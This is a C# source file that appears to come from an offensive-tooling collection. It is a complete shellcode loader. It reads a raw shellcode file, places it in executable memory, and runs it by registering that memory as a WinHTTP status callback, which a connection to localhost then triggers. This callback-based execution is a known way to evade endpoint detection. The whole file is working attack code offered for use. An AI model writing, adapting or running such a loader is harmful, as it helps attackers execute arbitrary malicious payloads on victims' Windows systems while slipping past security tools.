// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinHttpSetStatusCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinHttpSetStatusCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            uint WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
            string WINHTTP_NO_PROXY_NAME = null;
            string WINHTTP_NO_PROXY_BYPASS = null;

            IntPtr hSession = WinHttpOpen(null, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

            uint WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS = 0xFFFFFFFF;
            WinHttpSetStatusCallback(hSession, hAlloc, WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS, IntPtr.Zero);

            WinHttpConnect(hSession, "localhost", 80, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpOpen(
            string pszAgent,
            uint dwAccessType,
            string pszProxyW,
            string pszProxyBypass,
            uint dwFlags);

        [DllImport("Winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback,
            uint dwNotificationFlags,
            IntPtr dwReserved);

        [DllImport("winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpConnect(IntPtr hSession,
            string pswzServerName,
            short nServerPort,
            int dwReserved);

    }
}
